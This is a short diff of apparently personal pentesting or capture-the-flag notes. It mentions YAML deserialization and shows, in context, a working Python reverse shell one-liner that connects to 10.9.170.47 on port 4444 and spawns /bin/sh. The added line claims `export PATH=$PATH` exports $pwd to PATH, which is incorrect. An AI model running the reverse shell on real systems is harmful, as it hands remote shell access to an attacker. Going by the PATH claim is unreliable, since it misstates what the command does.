@@ -359,3 +359,8 @@ If there is `.yml` file involved, it is good to check if  `yaml deserialization 
 `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.170.47",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
 Python revererse shell one liner
+
+<br />
+<br />
+
+`export PATH=$PATH` exports `$pwd` to path
